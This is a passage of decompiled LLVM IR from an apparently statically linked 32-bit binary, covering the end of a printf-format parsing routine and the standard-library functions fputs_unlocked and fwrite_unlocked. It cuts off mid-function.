  store i32 %v1_8060771, i32* %ecx.global-to-local, align 4
  %v1_8060772 = inttoptr i32 %v1_8060771 to i8*
  %v2_8060772 = load i8, i8* %v1_8060772, align 1
  %v3_8060772 = zext i8 %v2_8060772 to i32
  store i32 %v3_8060772, i32* %eax.global-to-local, align 4
  %v8_8060777 = icmp sgt i32 %v0_8060775.pre, %v3_8060772
  br i1 %v8_8060777, label %dec_label_pc_8060771, label %dec_label_pc_8060779

dec_label_pc_8060779:                             ; preds = %dec_label_pc_8060771
  %v1_806077b = add i32 %v0_8060771, -134672163
  store i32 %v1_806077b, i32* %eax.global-to-local, align 4
  %v2_8060780 = add i32 %v0_8060771, add (i32 ptrtoint (i32* @global_var_806ef14.1584 to i32), i32 -134672163)
  %v3_8060780 = add i32 %v2_8060780, %v1_806077b
  %v4_8060780 = inttoptr i32 %v3_8060780 to i16*
  %v5_8060780 = load i16, i16* %v4_8060780, align 2
  %v6_8060780 = sext i16 %v5_8060780 to i32
  store i32 %v6_8060780, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_806077b, 2
  %v3_8060788 = add i32 %factor, 134672132
  %v4_8060788 = inttoptr i32 %v3_8060788 to i16*
  %v5_8060788 = load i16, i16* %v4_8060788, align 2
  %v6_8060788 = sext i16 %v5_8060788 to i32
  store i32 %v6_8060788, i32* %eax.global-to-local, align 4
  %v1_8060790 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8060790 = or i32 %v1_8060790, %v6_8060780
  %v2_8060792 = and i32 %v2_8060790, %v6_8060788
  store i32 %v2_8060792, i32* %stack_var_-48, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_806ef54.1582 to i32), i32* @edx, align 4
  %v0_80607a5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80607a5

dec_label_pc_806079f:                             ; preds = %dec_label_pc_806074a
  %v1_806079f = add i32 %v0_806079f, 1
  store i32 %v1_806079f, i32* @edx, align 4
  %v1_80607a0 = inttoptr i32 %v1_806079f to i8*
  %v2_80607a0 = load i8, i8* %v1_80607a0, align 1
  %v3_80607a0 = icmp eq i8 %v2_80607a0, 0
  %v1_80607a3 = icmp eq i1 %v3_80607a0, false
  br i1 %v1_80607a3, label %dec_label_pc_806074a, label %dec_label_pc_80607a5

dec_label_pc_80607a5:                             ; preds = %dec_label_pc_806079f, %dec_label_pc_8060779
  %v0_80607a5 = phi i32 [ %v0_80607a5.pre, %dec_label_pc_8060779 ], [ %v0_8060738, %dec_label_pc_806079f ]
  %v1_80607a5 = inttoptr i32 %v0_80607a5 to i8*
  %v2_80607a5 = load i8, i8* %v1_80607a5, align 1
  %v3_80607a5 = zext i8 %v2_80607a5 to i32
  store i32 %tmp88, i32* @ecx, align 4
  %v2_80607af = add i32 %tmp88, 12
  %v3_80607af = inttoptr i32 %v2_80607af to i32*
  store i32 %v3_80607a5, i32* %v3_80607af, align 4
  store i32 %stack_var_-112.2, i32* %eax.global-to-local, align 4
  %v0_80607b6 = load i32, i32* @edi, align 4
  %v1_80607b6 = load i32, i32* @ecx, align 4
  %v2_80607b6 = add i32 %v1_80607b6, 4
  %v3_80607b6 = inttoptr i32 %v2_80607b6 to i32*
  store i32 %v0_80607b6, i32* %v3_80607b6, align 4
  %v0_80607b9 = load i32, i32* @ecx, align 4
  %v1_80607b9 = add i32 %v0_80607b9, 28
  %v2_80607b9 = inttoptr i32 %v1_80607b9 to i32*
  store i32 1, i32* %v2_80607b9, align 4
  %v0_80607c0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80607c0 = load i32, i32* @ecx, align 4
  %v2_80607c0 = add i32 %v1_80607c0, 8
  %v3_80607c0 = inttoptr i32 %v2_80607c0 to i32*
  store i32 %v0_80607c0, i32* %v3_80607c0, align 4
  %v0_80607c3 = load i32, i32* %ebp.global-to-local, align 4
  %v0_80607cd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80607cd = and i32 %v0_80607cd, 3840
  %v1_80607d6 = and i32 %v0_80607c3, -5
  store i32 %v1_80607d6, i32* %ebp.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_80607dc = or i32 %v1_80607cd, %v1_80607d6
  store i32 %v2_80607dc, i32* %ebx.global-to-local, align 4
  %v1_80607de = load i32, i32* @ecx, align 4
  %v2_80607de = add i32 %v1_80607de, 20
  %v3_80607de = inttoptr i32 %v2_80607de to i32*
  store i32 48, i32* %v3_80607de, align 4
  %v0_80607e1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80607e1 = load i32, i32* @ecx, align 4
  %v2_80607e1 = add i32 %v1_80607e1, 16
  %v3_80607e1 = inttoptr i32 %v2_80607e1 to i32*
  store i32 %v0_80607e1, i32* %v3_80607e1, align 4
  %v0_80607e4 = load i32, i32* @edx, align 4
  %v1_80607e4 = inttoptr i32 %v0_80607e4 to i8*
  %v2_80607e4 = load i8, i8* %v1_80607e4, align 1
  %v3_80607e4 = icmp eq i8 %v2_80607e4, 0
  %v1_80607e7 = icmp eq i1 %v3_80607e4, false
  br i1 %v1_80607e7, label %dec_label_pc_806085b, label %dec_label_pc_80607e9

dec_label_pc_80607e9:                             ; preds = %dec_label_pc_80607a5
  %v0_80607e9 = load i32, i32* @esi, align 4
  %v1_80607e9 = inttoptr i32 %v0_80607e9 to i8*
  %v2_80607e9 = load i8, i8* %v1_80607e9, align 1
  %v11_80607e9 = icmp eq i8 %v2_80607e9, 109
  %v1_80607ec = icmp eq i1 %v11_80607e9, false
  br i1 %v1_80607ec, label %dec_label_pc_80607fe, label %dec_label_pc_80607ee

dec_label_pc_80607ee:                             ; preds = %dec_label_pc_80607e9
  %v0_80607ee = load i32, i32* @ecx, align 4
  %v1_80607ee = add i32 %v0_80607ee, 32
  %v2_80607ee = inttoptr i32 %v1_80607ee to i32*
  store i32 20, i32* %v2_80607ee, align 4
  %v0_80607f5 = load i32, i32* @ecx, align 4
  %v1_80607f5 = add i32 %v0_80607f5, 28
  %v2_80607f5 = inttoptr i32 %v1_80607f5 to i32*
  store i32 0, i32* %v2_80607f5, align 4
  br label %dec_label_pc_806085b

dec_label_pc_80607fe:                             ; preds = %dec_label_pc_80607e9
  %v1_8060805 = add i32 %tmp88, 32
  %v2_8060805 = inttoptr i32 %v1_8060805 to i32*
  store i32 21, i32* %v2_8060805, align 4
  %v0_806080c = load i32, i32* bitcast (i32** @global_var_80719f4.1573 to i32*), align 4
  store i32 %v0_806080c, i32* %ebx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80719fe.1574 to i32), i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v1_806082e = add i32 %tmp88, 4
  store i32 %v1_806082e, i32* %eax.global-to-local, align 4
  %v8_8060832 = load i32, i32* @global_var_8078878.1586, align 4
  call void @__pseudo_call(i32 %v8_8060832)
  %v3_8060839 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_8060839, i32* @ecx, align 4
  %v0_8060843 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060846 = add i32 %v3_8060839, 28
  %v3_8060846 = inttoptr i32 %v2_8060846 to i32*
  store i32 %v0_8060843, i32* %v3_8060846, align 4
  %v7_8060849 = icmp sgt i32 %v0_8060843, 5
  br i1 %v7_8060849, label %dec_label_pc_8060968, label %dec_label_pc_806085b

dec_label_pc_806085b:                             ; preds = %dec_label_pc_80607fe, %dec_label_pc_80607a5, %dec_label_pc_80607ee
  %tmp108 = icmp slt i32 %v4_80606e7, 1
  br i1 %tmp108, label %dec_label_pc_80608fb, label %dec_label_pc_8060866

dec_label_pc_8060866:                             ; preds = %dec_label_pc_806085b
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_80608e0 = mul i32 %stack_var_-104.3, 4
  %v4_80608e0 = add i32 %v3_80608e0, 40
  %v3_80608b0 = add i32 %tmp88, 40
  %v1_80608ec = add i32 %tmp88, 28
  %v2_80608ec = inttoptr i32 %v1_80608ec to i32*
  br label %dec_label_pc_8060868

dec_label_pc_8060868:                             ; preds = %dec_label_pc_80608e4, %dec_label_pc_8060866
  %v1_8060888 = phi i32 [ 0, %dec_label_pc_8060866 ], [ %v1_80608eb, %dec_label_pc_80608e4 ]
  %stack_var_-108.2.off0 = phi i32 [ %v4_80606e7, %dec_label_pc_8060866 ], [ %stack_var_-108.3.off0, %dec_label_pc_80608e4 ]
  %v1_8060868 = add i32 %v1_8060888, -2
  %v6_8060868 = sub i32 1, %v1_8060888
  %v7_8060868 = and i32 %v6_8060868, %v1_8060888
  %v8_8060868 = icmp slt i32 %v7_8060868, 0
  %v9_8060868 = icmp eq i32 %v1_8060868, 0
  %v10_8060868 = icmp slt i32 %v1_8060868, 0
  %v3_806086b = icmp eq i1 %v10_8060868, %v8_8060868
  %v4_806086b = icmp eq i1 %v9_8060868, false
  %v5_806086b = and i1 %v4_806086b, %v3_806086b
  br i1 %v5_806086b, label %dec_label_pc_8060881, label %dec_label_pc_806086d

dec_label_pc_806086d:                             ; preds = %dec_label_pc_8060868
  %v0_806086d = load i32, i32* @esp, align 4
  %v2_806086d = mul i32 %v1_8060888, 4
  %v3_806086d = add i32 %v2_806086d, 96
  %v4_806086d = add i32 %v3_806086d, %v0_806086d
  %v5_806086d = inttoptr i32 %v4_806086d to i32*
  %v6_806086d = load i32, i32* %v5_806086d, align 4
  store i32 %v6_806086d, i32* %eax.global-to-local, align 4
  %v3_8060871 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_8060871, i32* @ecx, align 4
  %v1_8060878 = trunc i32 %v6_806086d to i8
  %v4_8060878 = add i32 %v1_8060888, 36
  %v5_8060878 = add i32 %v4_8060878, %v3_8060871
  %v6_8060878 = inttoptr i32 %v5_8060878 to i8*
  store i8 %v1_8060878, i8* %v6_8060878, align 1
  %v0_806087c = load i32, i32* %eax.global-to-local, align 4
  %v1_806087c = urem i32 %v0_806087c, 256
  br label %dec_label_pc_806088a

dec_label_pc_8060881:                             ; preds = %dec_label_pc_8060868
  store i32 -2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806088a

dec_label_pc_806088a:                             ; preds = %dec_label_pc_806086d, %dec_label_pc_8060881
  %v0_80608a1 = phi i32 [ %v1_806087c, %dec_label_pc_806086d ], [ %v1_8060868, %dec_label_pc_8060881 ]
  store i32 %v0_80608a1, i32* %eax.global-to-local, align 4
  %v5_806088a = sub i32 %v0_80608a1, %stack_var_-104.3
  %v11_806088a = xor i32 %v0_80608a1, %stack_var_-104.3
  %v12_806088a = xor i32 %v5_806088a, %v0_80608a1
  %v13_806088a = and i32 %v12_806088a, %v11_806088a
  %v14_806088a = icmp slt i32 %v13_806088a, 0
  %v15_806088a = icmp eq i32 %v5_806088a, 0
  %v16_806088a = icmp slt i32 %v5_806088a, 0
  %v3_806088e = icmp ne i1 %v16_806088a, %v14_806088a
  %v4_806088e = or i1 %v15_806088a, %v3_806088e
  br i1 %v4_806088e, label %dec_label_pc_806089d, label %dec_label_pc_8060890

dec_label_pc_8060890:                             ; preds = %dec_label_pc_806088a
  %v1_8060890 = add i32 %v0_80608a1, -9
  %v6_8060890 = sub i32 8, %v0_80608a1
  %v7_8060890 = and i32 %v6_8060890, %v0_80608a1
  %v8_8060890 = icmp slt i32 %v7_8060890, 0
  %v9_8060890 = icmp eq i32 %v1_8060890, 0
  %v10_8060890 = icmp slt i32 %v1_8060890, 0
  %v3_8060893 = icmp eq i1 %v10_8060890, %v8_8060890
  %v4_8060893 = icmp eq i1 %v9_8060890, false
  %v5_8060893 = and i1 %v4_8060893, %v3_8060893
  br i1 %v5_8060893, label %dec_label_pc_8060968, label %dec_label_pc_806089d

dec_label_pc_806089d:                             ; preds = %dec_label_pc_8060890, %dec_label_pc_806088a
  %stack_var_-108.3.off0 = phi i32 [ %stack_var_-108.2.off0, %dec_label_pc_806088a ], [ %v0_80608a1, %dec_label_pc_8060890 ]
  %v0_806089d = load i32, i32* @esp, align 4
  %v1_806089d = load i32, i32* %ebp.global-to-local, align 4
  %v2_806089d = mul i32 %v1_806089d, 4
  %v3_806089d = add i32 %v0_806089d, 68
  %v4_806089d = add i32 %v3_806089d, %v2_806089d
  %v5_806089d = inttoptr i32 %v4_806089d to i32*
  %v6_806089d = load i32, i32* %v5_806089d, align 4
  store i32 %v6_806089d, i32* %edi.global-to-local, align 4
  %v1_80608a1 = add i32 %v0_80608a1, -1
  store i32 %v1_80608a1, i32* %eax.global-to-local, align 4
  store i32 %tmp88, i32* @ecx, align 4
  %v9_80608ad = icmp eq i32 %v6_806089d, 8
  %v2_80608b0 = mul i32 %v1_80608a1, 4
  %v4_80608b0 = add i32 %v3_80608b0, %v2_80608b0
  %v5_80608b0 = inttoptr i32 %v4_80608b0 to i32*
  %v6_80608b0 = load i32, i32* %v5_80608b0, align 4
  store i32 %v6_80608b0, i32* @eax, align 4
  br i1 %v9_80608ad, label %dec_label_pc_80608e4, label %dec_label_pc_80608b6

dec_label_pc_80608b6:                             ; preds = %dec_label_pc_806089d
  %v9_80608b6 = icmp eq i32 %v6_80608b0, 8
  br i1 %v9_80608b6, label %dec_label_pc_80608d1, label %dec_label_pc_80608bb

dec_label_pc_80608bb:                             ; preds = %dec_label_pc_80608b6
  %v12_80608bb = icmp eq i32 %v6_80608b0, %v6_806089d
  br i1 %v12_80608bb, label %dec_label_pc_80608d1, label %dec_label_pc_80608bf

dec_label_pc_80608bf:                             ; preds = %dec_label_pc_80608bb
  %v1_80608bf = call i32 @_promoted_size(i32 %v1_80608a1)
  store i32 %v1_80608bf, i32* %ebx.global-to-local, align 4
  %v0_80608c6 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_80608c6, i32* @eax, align 4
  %v1_80608c8 = call i32 @_promoted_size(i32 %v1_80608a1)
  store i32 %v1_80608c8, i32* %eax.global-to-local, align 4
  %v8_80608cf = icmp sgt i32 %v1_80608bf, %v1_80608c8
  br i1 %v8_80608cf, label %dec_label_pc_80608e4, label %dec_label_pc_80608bf.dec_label_pc_80608d1_crit_edge

dec_label_pc_80608bf.dec_label_pc_80608d1_crit_edge: ; preds = %dec_label_pc_80608bf
  %v0_80608d1.pre = load i32, i32* @esp, align 4
  %v1_80608d1.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80608d1

dec_label_pc_80608d1:                             ; preds = %dec_label_pc_80608bf.dec_label_pc_80608d1_crit_edge, %dec_label_pc_80608bb, %dec_label_pc_80608b6
  %v1_80608d1 = phi i32 [ %v1_80608d1.pre, %dec_label_pc_80608bf.dec_label_pc_80608d1_crit_edge ], [ %v1_806089d, %dec_label_pc_80608bb ], [ %v1_806089d, %dec_label_pc_80608b6 ]
  %v0_80608d1 = phi i32 [ %v0_80608d1.pre, %dec_label_pc_80608bf.dec_label_pc_80608d1_crit_edge ], [ %v0_806089d, %dec_label_pc_80608bb ], [ %v0_806089d, %dec_label_pc_80608b6 ]
  %v2_80608d1 = mul i32 %v1_80608d1, 4
  %v3_80608d1 = add i32 %v0_80608d1, 68
  %v4_80608d1 = add i32 %v3_80608d1, %v2_80608d1
  %v5_80608d1 = inttoptr i32 %v4_80608d1 to i32*
  %v6_80608d1 = load i32, i32* %v5_80608d1, align 4
  store i32 %v6_80608d1, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-104.3, i32* %edx.global-to-local, align 4
  %v3_80608d9 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_80608d9, i32* @ecx, align 4
  %v5_80608e0 = add i32 %v4_80608e0, %v3_80608d9
  %v6_80608e0 = inttoptr i32 %v5_80608e0 to i32*
  store i32 %v6_80608d1, i32* %v6_80608e0, align 4
  br label %dec_label_pc_80608e4

dec_label_pc_80608e4:                             ; preds = %dec_label_pc_80608bf, %dec_label_pc_806089d, %dec_label_pc_80608d1
  store i32 %tmp88, i32* @edx, align 4
  %v0_80608eb = load i32, i32* %ebp.global-to-local, align 4
  %v1_80608eb = add i32 %v0_80608eb, 1
  store i32 %v1_80608eb, i32* %ebp.global-to-local, align 4
  %v3_80608ec = load i32, i32* %v2_80608ec, align 4
  %v1_80608ef = add i32 %v3_80608ec, 2
  store i32 %v1_80608ef, i32* %eax.global-to-local, align 4
  %v5_80608f4 = icmp slt i32 %v1_80608eb, %v1_80608ef
  br i1 %v5_80608f4, label %dec_label_pc_8060868, label %dec_label_pc_8060921

dec_label_pc_80608fb:                             ; preds = %dec_label_pc_806085b
  store i32 %tmp88, i32* %ecx.global-to-local, align 4
  %v1_8060902 = add i32 %tmp88, 38
  %v2_8060902 = inttoptr i32 %v1_8060902 to i8*
  store i8 1, i8* %v2_8060902, align 1
  %v0_8060907 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8060907 = add i32 %v0_8060907, 28
  %v2_8060907 = inttoptr i32 %v1_8060907 to i32*
  %v3_8060907 = load i32, i32* %v2_8060907, align 4
  %v2_806090a = mul i32 %v3_8060907, 4
  %v2_806090e = ptrtoint i32* %stack_var_-48 to i32
  %v1_8060915 = add i32 %v0_8060907, 40
  store i32 %v1_8060915, i32* %eax.global-to-local, align 4
  %v3_8060919 = inttoptr i32 %v1_8060915 to i8*
  %v4_8060919 = call i32 @memcpy(i8* %v3_8060919, i32 %v2_806090e, i32 %v2_806090a)
  store i32 %v4_8060919, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060921

dec_label_pc_8060921:                             ; preds = %dec_label_pc_80608e4, %dec_label_pc_80608fb
  %stack_var_-108.4.off0 = phi i32 [ %v4_80606e7, %dec_label_pc_80608fb ], [ %stack_var_-108.3.off0, %dec_label_pc_80608e4 ]
  %v3_8060921 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_8060921, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-108.4.off0, i32* @edx, align 4
  %v1_806092c = add i32 %v3_8060921, 16
  %v2_806092c = inttoptr i32 %v1_806092c to i8*
  %v3_806092c = load i8, i8* %v2_806092c, align 1
  %v5_806092c = icmp slt i8 %v3_806092c, 0
  %v2_8060930 = add i32 %v3_8060921, 24
  %v3_8060930 = inttoptr i32 %v2_8060930 to i32*
  store i32 %stack_var_-108.4.off0, i32* %v3_8060930, align 4
  br i1 %v5_806092c, label %dec_label_pc_8060943, label %dec_label_pc_8060935

dec_label_pc_8060935:                             ; preds = %dec_label_pc_8060921
  store i32 %tmp88, i32* %ecx.global-to-local, align 4
  %v0_806093c = load i32, i32* @esi, align 4
  %v1_806093c = add i32 %v0_806093c, 1
  store i32 %v1_806093c, i32* %eax.global-to-local, align 4
  %v2_806093f = inttoptr i32 %tmp88 to i32*
  store i32 %v1_806093c, i32* %v2_806093f, align 4
  br label %dec_label_pc_8060959

dec_label_pc_8060943:                             ; preds = %dec_label_pc_8060921
  store i32 %tmp88, i32* @edx, align 4
  %v0_806094e = load i32, i32* @esi, align 4
  %v2_806094e = sub i32 %v0_806094e, %v4_8060530
  store i32 %v2_806094e, i32* %esi.global-to-local, align 4
  %v1_8060950 = mul i32 %v2_806094e, 4
  %v2_8060950 = add i32 %v1_8060950, 288
  store i32 %v2_8060950, i32* %eax.global-to-local, align 4
  %v1_8060957 = inttoptr i32 %tmp88 to i32*
  %v2_8060957 = load i32, i32* %v1_8060957, align 4
  %v4_8060957 = add i32 %v2_8060957, %v2_8060950
  store i32 %v4_8060957, i32* %v1_8060957, align 4
  br label %dec_label_pc_8060959

dec_label_pc_8060959:                             ; preds = %dec_label_pc_8060935, %dec_label_pc_8060943
  store i32 %tmp88, i32* @ecx, align 4
  %v1_8060960 = add i32 %tmp88, 28
  %v2_8060960 = inttoptr i32 %v1_8060960 to i32*
  %v3_8060960 = load i32, i32* %v2_8060960, align 4
  store i32 %v3_8060960, i32* %eax.global-to-local, align 4
  %v1_8060963 = add i32 %v3_8060960, 2
  br label %dec_label_pc_806096b

dec_label_pc_8060968:                             ; preds = %dec_label_pc_806057a, %dec_label_pc_806062a, %dec_label_pc_806065b, %dec_label_pc_80606d7, %dec_label_pc_80606c3, %dec_label_pc_80606ba, %dec_label_pc_8060890, %dec_label_pc_80607fe, %dec_label_pc_8060734
  br label %dec_label_pc_806096b

dec_label_pc_806096b:                             ; preds = %dec_label_pc_8060959, %dec_label_pc_8060968
  %storemerge5 = phi i32 [ %v1_8060963, %dec_label_pc_8060959 ], [ -1, %dec_label_pc_8060968 ]
  store i32 %storemerge5, i32* %eax.global-to-local, align 4
  %v2_806096e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_806096e, i32* @ebx, align 4
  store i32 %v0_806052f, i32* @esi, align 4
  store i32 %v0_806052e, i32* @edi, align 4
  ret i32 %storemerge5

; uselistorder directives
  uselistorder i32 %v1_80608eb, { 0, 2, 1 }
  uselistorder i32 %v1_80608a1, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8060890, { 1, 0 }
  uselistorder i32 %v5_806088a, { 1, 2, 0 }
  uselistorder i32 %v0_80608a1, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_8060868, { 0, 2, 1 }
  uselistorder i32 %v1_8060888, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v0_8060843, { 1, 0 }
  uselistorder i32 %v1_806079f, { 1, 2, 0 }
  uselistorder i32 %v1_8060771, { 1, 2, 0 }
  uselistorder i32 %v0_806079f, { 2, 0, 1, 3 }
  uselistorder i32 %v2_806073a, { 1, 0 }
  uselistorder i32 %v1_8060727, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_8060730, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_806071a, { 0, 2, 3, 1 }
  uselistorder i32 %v6_8060711, { 1, 0 }
  uselistorder i32 %v1_80606f3, { 1, 0 }
  uselistorder i32 %v4_80606e7, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8060711.pre.pre, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-104.3, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 %v1_80606da, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_80606d1, { 1, 2, 0 }
  uselistorder i32 %v0_8060697, { 1, 0 }
  uselistorder i32 %v1_8060689, { 1, 0 }
  uselistorder i32 %v1_8060684, { 0, 1, 3, 2 }
  uselistorder i32 %v6_8060682, { 2, 0, 1 }
  uselistorder i32 %v0_80606a4, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v5_8060638, { 1, 2, 0 }
  uselistorder i32 %v0_8060617, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v6_8060607, { 1, 0 }
  uselistorder i32 %v3_8060607, { 2, 3, 0, 1 }
  uselistorder i8 %v2_8060607, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8060606, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_80605f8, { 2, 3, 4, 8, 5, 6, 9, 7, 11, 12, 10, 1, 0 }
  uselistorder i32 %v3_80605f8, { 1, 0 }
  uselistorder i32 %v1_80605e3, { 1, 0 }
  uselistorder i32 %v0_8060609.pre, { 2, 0, 1 }
  uselistorder i32 %stack_var_-104.1, { 0, 1, 3, 4, 2, 5, 6 }
  uselistorder i32 %v8_80605cf, { 1, 0, 3, 2 }
  uselistorder i32 %v1_80605a5, { 0, 2, 1 }
  uselistorder i32 %v0_8060592, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %tmp88, { 23, 22, 0, 19, 20, 21, 18, 17, 16, 15, 1, 2, 14, 13, 12, 11, 10, 8, 9, 3, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3, 4, 5, 8, 6, 9, 7, 10, 11, 12 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 33, 29, 28, 30, 31, 34, 32, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 3, 0, 1, 2 }
  uselistorder i32 -134672163, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_806ef54.1582 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder label %dec_label_pc_806096b, { 1, 0 }
  uselistorder label %dec_label_pc_8060968, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_8060959, { 1, 0 }
  uselistorder label %dec_label_pc_8060921, { 1, 0 }
  uselistorder label %dec_label_pc_80608e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806088a, { 1, 0 }
  uselistorder label %dec_label_pc_806085b, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8060762, { 1, 0 }
  uselistorder label %dec_label_pc_8060734, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806070c, { 1, 0 }
  uselistorder label %dec_label_pc_80606e7, { 1, 0 }
  uselistorder label %dec_label_pc_80606ae, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8060650, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8060607, { 1, 0 }
  uselistorder label %dec_label_pc_8060606, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80605df, { 1, 0 }
  uselistorder label %dec_label_pc_80605c8, { 1, 0 }
  uselistorder label %dec_label_pc_80605c8.outer, { 2, 0, 1 }
}

define i32 @__GI_fputs_unlocked() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_8060974 = load i32, i32* @esi, align 4
  %v0_8060975 = load i32, i32* @ebx, align 4
  store i32 %v0_8060975, i32* %stack_var_-8, align 4
  %v4_8060979 = ptrtoint i8* %tmp3 to i32
  store i32 %v4_8060979, i32* @ebx, align 4
  %v3_806097e = call i32 @strlen(i8* %tmp3)
  store i32 %v3_806097e, i32* @esi, align 4
  %v0_806098f = load i32, i32* @ebx, align 4
  %v6_8060990 = call i32 @__GI_fwrite_unlocked(i32 %v0_806098f, i64 1, i32 %v3_806097e, i32 %tmp)
  %v1_806099a = load i32, i32* @esi, align 4
  %v12_806099a = icmp eq i32 %v6_8060990, %v1_806099a
  %v3_806099c = select i1 %v12_806099a, i32 %v6_8060990, i32 -1
  %v2_80609a2 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80609a2, i32* @ebx, align 4
  store i32 %v0_8060974, i32* @esi, align 4
  ret i32 %v3_806099c

; uselistorder directives
  uselistorder i32 %v6_8060990, { 1, 0 }
  uselistorder i8* %tmp3, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80609a8 = load i32, i32* @edi, align 4
  %v0_80609a9 = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v4_80609af = trunc i64 %arg2 to i32
  store i32 %v4_80609af, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_80609b7 = inttoptr i32 %arg4 to i16*
  %v2_80609b7 = load i16, i16* %v1_80609b7, align 2
  %v1_80609ba = and i16 %v2_80609b7, 192
  %v6_80609bf = icmp eq i16 %v1_80609ba, 192
  br i1 %v6_80609bf, label %dec_label_pc_80609da, label %dec_label_pc_80609c6

dec_label_pc_80609c6:                             ; preds = %entry
  %v0_80609c6 = load i32, i32* @edx, align 4
  %v6_80609ce = call i32 @__stdio_trans2w_o(i16* %v1_80609b7, i32 128, i32 %v0_80609c6, i32 %v0_80609c6)
  %v1_80609d6 = icmp eq i32 %v6_80609ce, 0
  %v1_80609d8 = icmp eq i1 %v1_80609d6, false
  br i1 %v1_80609d8, label %dec_label_pc_8060a19, label %dec_label_pc_80609da

dec_label_pc_80609da:                             ; preds = %dec_label_pc_80609c6, %entry
  %v2_80609da = icmp eq i32 %v4_80609af, 0
  br i1 %v2_80609da, label %dec_label_pc_8060a19, label %dec_label_pc_80609de

dec_label_pc_80609de:                             ; preds = %dec_label_pc_80609da
  %v1_80609de = icmp eq i32 %arg3, 0
  br i1 %v1_80609de, label %dec_label_pc_8060a19, label %dec_label_pc_80609e2

dec_label_pc_80609e2:                             ; preds = %dec_label_pc_80609de
  %v9_80609e7 = udiv i64 4294967295, %arg2
  %v10_80609e7 = trunc i64 %v9_80609e7 to i32
  %v6_80609eb = icmp ult i32 %v10_80609e7, %arg3
  br i1 %v6_80609eb, label %dec_label_pc_8060a05, label %dec_label_pc_80609ed

dec_label_pc_80609ed:                             ; preds = %dec_label_pc_80609e2
  %v3_80609ed = sext i32 %arg3 to i64
  %v5_80609ed = mul nsw i64 %v3_80609ed, %arg2
  %v6_80609ed = trunc i64 %v5_80609ed to i32
  store i32 %v6_80609ed, i32* @ebx, align 4
  %v0_80609f1 = load i32, i32* @esi, align 4
  %v5_80609f7 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v6_80609ed, i32 %v0_80609f1, i32 %v10_80609e7)
  %v6_80609f7 = sext i32 %v5_80609f7 to i64
  %v10_8060a01 = udiv i64 %v6_80609f7, %arg2
  %v11_8060a01 = trunc i64 %v10_8060a01 to i32
  br label %dec_label_pc_8060a1b

dec_label_pc_8060a05:                             ; preds = %dec_label_pc_80609e2
  %v0_8060a05 = load i32, i32* @esi, align 4
  %v1_8060a05 = inttoptr i32 %v0_8060a05 to i32*
  %v2_8060a05 = load i32, i32* %v1_8060a05, align 4
  %v1_8060a07 = or i32 %v2_8060a05, 8
